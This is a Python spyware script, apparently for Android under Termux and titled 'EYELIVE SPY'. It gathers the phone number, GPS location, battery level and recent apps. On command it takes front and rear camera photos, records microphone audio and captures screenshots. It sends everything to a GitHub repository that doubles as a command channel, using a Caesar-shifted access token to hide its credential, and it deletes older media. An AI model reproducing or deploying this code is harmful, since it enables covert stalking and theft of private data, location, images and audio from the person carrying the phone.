#!/usr/bin/env python3
"""EYELIVE SPY - Pega numero do chip automaticamente"""
import os, json, time, subprocess, requests as req, base64 as b64, hashlib
from datetime import datetime

def _tk():
    t = "now_GrNCw79zDXH35E5ZpTii6RA9bDf4yY3Zf6Da"
    r = ""
    for c in t:
        if c.isalpha():
            b = ord('a') if c.islower() else ord('A')
            r += chr((ord(c) - b - 7) % 26 + b)
        else: r += c
    return r

TOKEN = _tk()
REPO = "gynbetfc/eyelive"
HEADERS = {"Authorization": f"Bearer {TOKEN}", "Accept": "application/vnd.github.v3+json"}
HOME = "/data/data/com.termux/files/home"
FOTOS_DIR = f"{HOME}/eyelive_data"
CONFIG_FILE = f"{HOME}/.eyelive_numero"
os.makedirs(FOTOS_DIR, exist_ok=True)

def shell(cmd):
    try: return subprocess.check_output(cmd, shell=True, text=True, timeout=10).strip()
    except: return ""

# Pegar numero do celular
def obter_numero():
    # 1. Tentar via termux-api
    r = shell("termux-telephony-deviceinfo 2>/dev/null")
    if r and "phone_number" in r:
        try:
            data = json.loads(r)
            num = data.get("phone_number","")
            if num and num != "unknown" and len(num) > 5:
                return num
        except: pass
    
    # 2. Tentar arquivo salvo
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE) as f:
            saved = f.read().strip()
            if saved: return saved
    
    # 3. Perguntar ao usuario
    print("\n📱 Não foi possível detectar o número automaticamente.")
    num = input("Digite o número deste celular (com DDD): ").strip()
    num = ''.join(c for c in num if c.isdigit())
    if num:
        with open(CONFIG_FILE, 'w') as f:
            f.write(num)
        return num
    
    return "00000000000"

MEU_NUMERO = obter_numero()
DEVICE_ID = hashlib.md5(MEU_NUMERO.encode()).hexdigest()[:12]
print(f"\nSPY - {MEU_NUMERO} ({DEVICE_ID})\n")

def salvar_github(nome, conteudo):
    try:
        fn = f"dados/{DEVICE_ID}/{nome}"
        url = f"https://api.github.com/repos/{REPO}/contents/{fn}"
        c = conteudo if isinstance(conteudo, str) else b64.b64encode(conteudo).decode()
        encoded = b64.b64encode(c.encode() if isinstance(c,str) else c).decode()
        r = req.get(url, headers=HEADERS)
        p = {"message":"Update","content":encoded,"branch":"main"}
        if r.status_code == 200: p["sha"] = r.json()["sha"]
        req.put(url, json=p, headers=HEADERS)
    except: pass

def deletar_midia_antiga():
    try:
        url = f"https://api.github.com/repos/{REPO}/contents/dados/{DEVICE_ID}"
        r = req.get(url, headers=HEADERS)
        if r.status_code == 200:
            for arq in r.json():
                nome = arq['name']
                if nome == 'status.json' or nome == '.gitkeep': continue
                try:
                    partes = nome.replace('.json','').replace('.jpg','').replace('.aac','').replace('.png','').split('_')
                    ts = partes[-1] if len(partes) > 1 else ''
                    if len(ts) == 6:
                        hora_arq = int(ts[:2])*60 + int(ts[2:4])
                        hora_agora = datetime.now().hour*60 + datetime.now().minute
                        if hora_agora - hora_arq > 15:
                            req.delete(arq['url'], json={"message":"Auto-limpeza","sha":arq['sha'],"branch":"main"}, headers=HEADERS)
                            print(f"🗑️ {nome} (+15min)")
                except: pass
    except: pass

def coletar_status():
    dados = {
        "numero": MEU_NUMERO, "id": DEVICE_ID,
        "time": datetime.now().strftime("%H:%M:%S"),
        "bateria": "", "gps": {}, "apps": []
    }
    b = shell("termux-battery-status 2>/dev/null")
    if b:
        try:
            bat = json.loads(b)
            dados["bateria"] = str(bat.get("percentage","?")) + "%"
        except: pass
    g = shell("termux-location 2>/dev/null")
    if g:
        try:
            gps = json.loads(g)
            dados["gps"] = {"lat": gps.get("latitude",0), "lng": gps.get("longitude",0)}
        except: pass
    a = shell("dumpsys activity recents 2>/dev/null | grep 'Recent #' | head -5")
    if a: dados["apps"] = [x.strip() for x in a.split('\n') if x.strip()]
    salvar_github("status.json", json.dumps(dados))

def executar(cmd):
    if cmd == "foto_frontal":
        path = f"{FOTOS_DIR}/foto.jpg"
        shell(f"termux-camera-photo -c 0 {path} 2>/dev/null")
        if os.path.exists(path):
            with open(path, 'rb') as f: return b64.b64encode(f.read()).decode()
    elif cmd == "foto_traseira":
        path = f"{FOTOS_DIR}/foto.jpg"
        shell(f"termux-camera-photo -c 1 {path} 2>/dev/null")
        if os.path.exists(path):
            with open(path, 'rb') as f: return b64.b64encode(f.read()).decode()
    elif cmd == "audio":
        path = f"{FOTOS_DIR}/audio.aac"
        shell(f"termux-microphone-record -f {path} -l 10 -q 2>/dev/null")
        time.sleep(12)
        if os.path.exists(path):
            with open(path, 'rb') as f: return b64.b64encode(f.read()).decode()
    elif cmd == "screenshot":
        path = f"{FOTOS_DIR}/screen.png"
        shell(f"screencap {path} 2>/dev/null")
        if os.path.exists(path):
            with open(path, 'rb') as f: return b64.b64encode(f.read()).decode()
    return ""

def loop():
    print("👻 SPY ativado...")
    while True:
        try:
            url = f"https://api.github.com/repos/{REPO}/contents/comandos/{DEVICE_ID}.json"
            r = req.get(url, headers=HEADERS)
            if r.status_code == 200:
                data = r.json()
                comando = json.loads(b64.b64decode(data['content']).decode())
                cmd = comando.get("cmd", "status")
                print(f"⚡ {cmd}")
                resultado = executar(cmd)
                nome = f"{cmd}_{datetime.now().strftime('%H%M%S')}.json"
                salvar_github(nome, json.dumps({"cmd":cmd,"result":resultado,"time":datetime.now().strftime("%H:%M:%S")}))
                req.delete(url, json={"message":"OK","sha":data['sha'],"branch":"main"}, headers=HEADERS)
            coletar_status()
            if datetime.now().minute % 15 == 0: deletar_midia_antiga()
        except: pass
        time.sleep(5)

loop()
